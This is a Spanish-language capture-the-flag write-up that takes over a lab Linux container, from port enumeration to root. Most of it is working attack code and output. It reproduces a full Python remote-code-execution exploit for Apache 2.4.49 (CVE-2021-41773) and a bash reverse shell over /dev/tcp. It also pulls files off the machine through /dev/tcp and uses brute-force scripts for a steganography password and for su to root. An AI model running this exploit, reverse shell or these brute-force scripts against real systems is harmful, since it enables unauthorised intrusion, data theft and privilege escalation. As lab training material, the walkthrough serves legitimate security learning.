## FASE ENUMERACIÓN

Sabiendo que la IP de la máquina victima es :172.17.0.2
comprobamos trazabilidad:
```bash
ping -c 1 172.17.0.2
```
```
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.064 ms

--- 172.17.0.2 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.064/0.064/0.064/0.000 ms
```

tenemos trazabilidad con la máquina y con el ttl=64 sabemos que se trata de una linux

Comprobamos que puertos tiene abiertos y que servicios y versiones corren por ellos:
```bash
 sudo nmap -Pn -n -sS -p- --open -sCV --min-rate 5000 172.17.0.2 -oN PuertosYservicios
```
```
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.49 ((Unix))
|_http-title: Comando Ping
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.49 (Unix)
MAC Address: 02:42:AC:11:00:02 (Unknown)
```
 -Puerto 80
 Si más que rascar vamos a lanzar un whatweb para ver que nos reporta:

 ```bash
whatweb http://172.17.0.2    | tee whatweb
```
```
http://172.17.0.2 [200 OK] Apache[2.4.49], Country[RESERVED][ZZ], HTML5, HTTPServer[Unix][Apache/2.4.49 (Unix)], IP[172.17.0.2], Title[Comando Ping]
```
que corre un apache 2.4.49 y poco más...bueno poco más...es versión vulnerable

abrimos la página y con CTRL+C miramos el código fuente, donde vemos cosas imteresantes:
```
   <div data-note="Hay pistas en un html , fuzzing de ficheros"></div>
```

Así pues procedemos a hacer un fuzzing:
```bash
 feroxbuster -u "http://172.17.0.2" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  -x php,html,txt,js,old,bak -o fuzzFero
```
```
200      GET      110l      349w     4688c http://172.17.0.2/
200      GET      110l      349w     4688c http://172.17.0.2/index.html
200      GET       28l       66w      766c http://172.17.0.2/html.html
```
En http://172.17.0.2/html.html podemos leer lo siguiente:
```
En principio a punky le gusta ping y hacer cosas raras con ese versatil comando
```

bueno vamos a centrarnos en la version vunerable de apache:
```bash
gobuster dir -u http://172.17.0.2/cgi-bin/ -w /usr/share/wordlists/dirb/common.txt -x sh,txt,php,html,pl,py,cgi,bak -t 50                                                                
```
```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2/cgi-bin/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,pl,py,cgi,bak,sh,txt,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/printenv             (Status: 500) [Size: 531]
/shell.cgi            (Status: 500) [Size: 531]
/test-cgi             (Status: 500) [Size: 531]
Progress: 41526 / 41535 (99.98%)
===============================================================
Finished
===============================================================
```
busco vulnerabilidades para esa versión y encuentro este script:
```bash
https://github.com/thehackersbrain/CVE-2021-41773
```
```
# Exploit Title: Apache HTTP Server 2.4.49 - Path Traversal & Remote Code Execution (RCE)
# Exploit Author: Gaurav Raj https://gauravraj.xyz
# Vendor Homepage:  https://apache.org/
# Version: 2.4.49
# Tested on: 2.4.49
# CVE : CVE-2021-41773


#!/usr/bin/python3

import argparse
import requests


def runcmd(target):
    url = 'http://{}'.format(target)
    req = requests.get(url)
    while True:
        cmd = input("\033[1;36m>>> \033[0m")
        if (cmd != 'exit'):
            if ('https' not in req.url):
                url = "http://{}/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh".format(
                    target)
            else:
                url = "https://{}/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh".format(
                    target)
            data = "echo Content-Type: text/plain; echo; {}".format(cmd)
            session = requests.Session()
            req = requests.Request(
                method='POST', url=url, data=data).prepare()
            req.url = url
            print(session.send(req).text, end='')

        else:
            exit(0)


def banner():
    print('''--------------------------------------------------------
|                \033[1;32mApache2 2.4.49\033[1;37m - \033[1;31mExploit\033[0m              |
--------------------------------------------------------''')


def main():
    parser = argparse.ArgumentParser(description="Apache2 2.4.49 Exploit")
    parser.add_argument(
        '-t', '--target', help='Specify the target IP or Domain. eg: 127.0.0.1 or example.com', required=True)
    arg = parser.parse_args()
    banner()
    try:
        runcmd(arg.target)
    except KeyboardInterrupt:
        exit(1)
    except EOFError:
        exit(1)


if __name__ == '__main__':
    main()
```
me pongo en escucha en el puerto 4444
```bash
sudo nc -nvlp 4444
```
ejecuto el script
```bash
python exploit2 -t 172.17.0.2
```
creo un script en /tmp
```bash
echo "/bin/bash -i >& /dev/tcp/172.17.0.1/4444 0>&1 " > /tmp/rev.sh
```
y lo ejecuto
```bash
/bin/bash /tmp/rev.sh
```
tratamiento tty:
```bash
script /dev/null -c bash
ctrl+z
stty raw -echo; fg
reset
xterm
export TERM=xterm
export SHELL=bash
stty rows 51 columns 237
```
## ESCALADA DE PRIVILEGIOS

compruebo si hay permisos suid 
```bash
find / -perm -4000 2>/dev/null
```
```
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/su
/usr/bin/mount
/usr/bin/umount
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/at
/usr/local/bin/task_manager
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
```
veo "at" visito https://gtfobins.github.io/
pero no puedo usarlo
miramos los usuarios:
```bash
cat /etc/passwd | grep sh$
```
```
root:x:0:0:root:/root:/bin/bash
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
punky:x:1001:1001:,,,:/home/punky:/bin/bash
```
veo algo interesante:
```bash
cat /usr/include/musica/.stego
```
```
Descarga el fichero como insinua la web y realiza fuerza bruta para hallar el password que esconde la contraseña del usuario.
Ten en cuenta que la salida del comando "snow" siempre devuelve datos y ha sido escondida  con el siguinete formato password:XXXXXXXXXX
```
y veo un archivo mp3 que probablemente usando snow pueda romper y ver la data que esconde
```bash
ls -la /usr/include/musica/
```
```
total 2868
drwxr-xr-x 1 root     root        4096 May 11 09:17 .
drwxr-xr-x 1 root     root        4096 May  3 06:08 ..
-rw-rw---- 1 www-data www-data     265 May 11 09:17 .stego
-rw-r--r-- 1 www-data www-data 2918537 May  4 06:19 elperro.mp3
-r-------- 1 www-data root         917 May  9 01:20 miletra.txt
```

no puedo utilizar ni scp, ni nc, ni python ni, ni wget, ni curl...pero con la medio pista del ping, he recordado que en las trazas ICMP pero como hay que trocear el archivo y hacer mil cosas antes pruebo lo siguiente:

en la máquina victima me pongo en escucha para recibir un archivo:
```bash
 nc -lvnp 1337 > elperro.mp3
```
y en la maquina victima mediante /dev/tcp intento enviarmelo:
```bash
cat elperro.mp3 > /dev/tcp/172.17.0.1/1337
```
hacemos lo mismo para el archivo miletra.txt
```bash
nc -lvnp 1337 > miletra.txt
```
```bash
cat miletra.txt > /dev/tcp/172.17.0.1/1337
```
y parece que funciona, ahora tenemos que correr snow y hacer fuerzabruta
descargo snow de esta página:
```bash
https://darkside.com.au/snow/
```
descomprimo
```bash
 tar -xvzf snow-20130616.tar.gz
```
entro en la carpeta:
```bash
cd snow-20130616
```
hago un make para compilar
```bash
make
```
me da este error:
```
cc -O   -c -o main.o main.c
main.c: In function ‘main’:
main.c:180:17: error: implicit declaration of function ‘strcmp’ [-Wimplicit-function-declaration]
  180 |             if (strcmp (argv[optind], "--help") == 0) {
      |                 ^~~~~~
main.c:40:1: note: include ‘<string.h>’ or provide a declaration of ‘strcmp’
   39 | #include "snow.h"
  +++ |+#include <string.h>
   40 | 
make: *** [<integrado>: main.o] Error 1

```
hacemos un nano a main.c
```bash
nano main.c
```
buscamos la linea :
```
#include "snow.h"
```
y debajo ponemos:
```bash
#include <string.h>
```
y ahora cuando hacemos el make ya funciona

en teoría snow funciona así:
```
./snow -p password  archivo
```
hago un script para miletra.txt (probe con el mp3 y no encontre nada :

```bash
#!/bin/bash
#ruta diccionario
wordlist="/usr/share/wordlists/rockyou.txt"
#ruta del archivo
target_file="/home/kali/Desktop/vulnix/thedog/trabajo/codificado/snow-20130616/miletra.txt"
total_lines=$(wc -l < "$wordlist")
count=0

while read -r passwd; do
    ((count++))
    progress=$(( 100 * count / total_lines ))

    # Barra de progreso (20 caracteres)
    filled=$(( progress / 5 ))
    empty=$(( 20 - filled ))
    bar=$(printf "%0.s#" $(seq 1 $filled))
    bar+=$(printf "%0.s-" $(seq 1 $empty))

    # Mostrar barra + pass en la misma línea
    echo -ne "\r[${bar}] ${progress}% Probando: ${passwd}    "

    # Ejecutar snow con la contraseña
    output=$(./snow -C -Q -p "$passwd" "$target_file" 2>/dev/null)

    # Verificar si la salida contiene 'password:'
    if [[ -n "$output" && "$output" == *"password:"* ]]; then
        echo -e "\n✅ Contraseña encontrada: $passwd"
        echo "🔐 Mensaje oculto:"
        echo "$output"
        exit 0
    fi

done < "$wordlist"

echo -e "\n❌ No se encontró la contraseña en el diccionario."
```
```bash
 ./fuerzabruta.sh                                                                                                                                       ░▒▓ ✔ │ 14s   
```
```
[#--------------------] 0% Probando: superman      
✅ Contraseña encontrada: superman
🔐 Mensaje oculto:
password:secret
```
pruebo a convertirme en el usuario punky con la contraseña secret:
```bash
su punky
```
```bash
id
```
```
uid=1001(punky) gid=1001(punky) groups=1001(punky),100(users),1002(suidgroup)
```
veo que pertenezco al grupo suidgroup, voy a buscar archvos del grupo:
```bash
find / -group suidgroup 2>/dev/null
```
```
/usr/local/bin/task_manager
```
```bash
ls -la /usr/local/bin/task_manager
```
```
-rwsr-x--- 1 root suidgroup 16712 May 11 08:55 /usr/local/bin/task_manager
```
lo ejecuto y despues de no saber que leches hace pruebo a leer el help:
````bash
/usr/local/bin/task_manager -h
```
```
Uso: /usr/local/bin/task_manager -d <detalles_de_tarea> [-c <archivo_config>] [-o <archivo_log>]
Opciones:
  -d DETALLES   Descripción de la tarea a ejecutar/registrar. ¡Este es el importante!
  -c CONFIG     Ruta al archivo de configuración de la tarea (opcional).
  -o OUTPUT_LOG Ruta al archivo donde se registrará la salida (opcional).
  -h            Muestra esta ayuda.

PISTA: Los detalles a veces pueden ser... más que simples palabras.
```
intento inyectar mil cosas sobre todo mirando la salida de los logs de /tmp y nada, al tratarse de un binario
antes de nada pruebo a hacer un strings:
```bash
strings /usr/local/bin/task_manager
```
en la salida veo algo interesante:
```
password
123456
qwerty
admin
guest
root
user
hannah
default
1234
0000
1111
9876
asdfgh
zxcvbn
qwertz
aaaaaa
bbbbbb
111111
```
parecen contraseñas
 creo un dicionario con las contraseñas y lo llamo diccionario.txt y hago un script para probarlas intentando hacerme usuario root:
```bash
#!/bin/bash

# Archivo con lista de contraseñas (una por línea)
WORDLIST="diccionario.txt"

# Usuario al que intentar acceder
USER="root"

# Archivo para guardar contraseñas probadas
LOGFILE="su_bruteforce.log"

# Intentar cada password
while IFS= read -r password; do
    echo "Probando contraseña: $password"

    # Intentar hacer su con password (timeout 5s para no colgar)
    echo "$password" | timeout 5 su -c "id" $USER 2>/dev/null >/dev/null

    # Revisar código de salida (0 = éxito)
    if [ $? -eq 0 ]; then
        echo "Contraseña encontrada: $password"
        echo "$password" > success_password.txt
        exit 0
    fi

done < "$WORDLIST"

echo "No se encontró la contraseña en el diccionario."
exit 1
```
le doy permisos de ejecución y lo prubo:
```bash
chmod +x fuerzabruta.sh 
./fuerzabruta.sh 
```
```
Probando contraseña: password
Probando contraseña: 123456
Probando contraseña: qwerty
Probando contraseña: admin
Probando contraseña: guest
Probando contraseña: root
Probando contraseña: user
Probando contraseña: hannah
Contraseña encontrada: hannah
```
parece que la contraseña hannah es la de root, probamos:
```bash
su root
```
```
punky@f212345cfd62:/tmp$ su root
Password: 
root@f212345cfd62:/tmp# id
uid=0(root) gid=0(root) groups=0(root)
root@f212345cfd62:/tmp# 
```

